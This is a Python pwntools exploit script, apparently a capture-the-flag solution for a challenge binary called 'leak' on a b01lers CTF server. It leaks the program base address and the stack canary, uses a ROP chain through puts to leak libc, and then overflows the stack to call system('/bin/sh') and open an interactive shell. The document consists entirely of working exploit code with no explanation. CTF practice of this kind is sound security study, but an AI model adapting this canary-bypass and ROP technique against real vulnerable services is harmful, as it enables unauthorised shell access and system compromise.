#!/usr/bin/python
from pwn import *

io = remote("chal.ctf.b01lers.com", 1009)
elf = ELF("./leak")
libc = ELF("leaks-libc")


offset = 40
ret = 0x0101a #ret
pr = 0x13f3 #pop_rdi;ret

io.recv()

def leak_base_address():
        io.sendline("16")
        io.sendline("A"*16)
        io.sendline("8")
        io.sendline("A"*8)
        io.recvline()

        address = u64(("\x00" + io.recvline().strip()).ljust(8, "\x00"))
        base_address = address - elf.sym["_start"]

        log.info("Base Address: " + hex(base_address))
        return base_address

def leak_canary():
        io.sendline("24")
        io.sendline("A"*24)
        io.recvline()
        canary = u64(("\x00" + io.recvline().strip()[:7]).ljust(8, "\x00"))
        log.info("Canary: " + hex(canary))
        return canary
        
def leak_stack_canary(size, payload):
        io.sendline(size)
        io.sendline(payload)


base_address = leak_base_address() #leak _start from the stack
canary = leak_canary() #leak stack_canary

payload = "A"*24
payload += p64(canary)
payload += "JUNKJUNK"
payload += p64(ret + base_address)
payload += p64(pr + base_address)
payload += p64(elf.got["puts"] + base_address)
payload += p64(0x10a0 + base_address)
payload += p64(ret + base_address)
payload += p64(elf.sym["main"] + base_address)

leak_stack_canary("88", payload) #control RIP leak libc_address

io.recvline()
libc_address = u64(io.recvline().strip().ljust(8, "\x00"))
libc_address = libc_address - libc.sym["puts"]
log.info("Leaked Libc: " + hex(libc_address))

io.recv()

leak_stack_canary("16", "A"*16)

for i in range(1, 3):
        io.sendline("4")
        io.sendline("A"*4)
        io.recvline()
        io.recvline()
        

bin_sh = libc_address + libc.search("/bin/sh").next()
system = libc_address + libc.sym["system"]


payload = "A"*24
payload += p64(canary)
payload += "JUNKJUNK"
payload += p64(ret + base_address)
payload += p64(pr + base_address)
payload += p64(bin_sh)
payload += p64(system)

leak_stack_canary("72", payload) #get a shell
io.interactive()
